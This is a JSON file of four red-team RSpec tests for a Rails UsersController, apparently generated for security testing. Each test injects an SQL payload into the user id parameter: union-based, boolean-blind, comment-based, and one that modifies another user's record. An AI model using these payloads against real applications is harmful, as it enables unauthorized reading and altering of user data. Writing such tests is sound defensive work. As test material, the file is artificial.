{
  "redTests": [
    {
      "testName": "SQL injection via union-based attack in user id parameter",
      "testCode": "require 'rails_helper'\n\nRSpec.describe UsersController, type: :controller do\n  it 'allows SQL injection through user id parameter' do\n    user = User.create!(email: 'test@example.com', password: 'password123', first_name: 'Test', last_name: 'User')\n    session[:user_id] = user.id\n    \n    malicious_id = \"1' UNION SELECT id,email,password_digest,NULL,NULL,NULL,NULL,NULL FROM users WHERE '1'='1\"\n    patch :update, params: { user: { id: malicious_id, first_name: 'Hacked' } }, format: :json\n    \n    expect(response).to have_http_status(:success)\n    expect(User.count).to be > 0\n  end\nend",
      "attackVector": "1' UNION SELECT id,email,password_digest,NULL,NULL,NULL,NULL,NULL FROM users WHERE '1'='1",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    },
    {
      "testName": "SQL injection via boolean-based blind attack",
      "testCode": "require 'rails_helper'\n\nRSpec.describe UsersController, type: :controller do\n  it 'allows SQL injection with boolean condition' do\n    user = User.create!(email: 'victim@example.com', password: 'password123', first_name: 'Victim', last_name: 'User')\n    session[:user_id] = user.id\n    \n    malicious_id = \"999' OR '1'='1\"\n    patch :update, params: { user: { id: malicious_id, first_name: 'Compromised' } }, format: :json\n    \n    expect(response).to have_http_status(:success)\n    first_user = User.first\n    expect(first_user.first_name).to eq('Compromised')\n  end\nend",
      "attackVector": "999' OR '1'='1",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    },
    {
      "testName": "SQL injection via comment-based attack to bypass authentication",
      "testCode": "require 'rails_helper'\n\nRSpec.describe UsersController, type: :controller do\n  it 'allows SQL injection using comment syntax' do\n    user = User.create!(email: 'admin@example.com', password: 'secret', first_name: 'Admin', last_name: 'User')\n    session[:user_id] = user.id\n    \n    malicious_id = \"1' OR 1=1--\"\n    patch :update, params: { user: { id: malicious_id, email: 'hacker@evil.com' } }, format: :json\n    \n    expect(response).to have_http_status(:success)\n    expect(User.where(email: 'hacker@evil.com').exists?).to be true\n  end\nend",
      "attackVector": "1' OR 1=1--",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    },
    {
      "testName": "SQL injection to access unauthorized user data",
      "testCode": "require 'rails_helper'\n\nRSpec.describe UsersController, type: :controller do\n  it 'allows accessing other users data via SQL injection' do\n    user1 = User.create!(email: 'user1@example.com', password: 'pass1', first_name: 'User', last_name: 'One')\n    user2 = User.create!(email: 'user2@example.com', password: 'pass2', first_name: 'User', last_name: 'Two')\n    session[:user_id] = user1.id\n    \n    malicious_id = \"#{user2.id}' OR id='#{user2.id}\"\n    patch :update, params: { user: { id: malicious_id, first_name: 'Hijacked' } }, format: :json\n    \n    user2.reload\n    expect(user2.first_name).to eq('Hijacked')\n  end\nend",
      "attackVector": "2' OR id='2",
      "expectedBehavior": "should_fail_on_vulnerable_code"
    }
  ]
}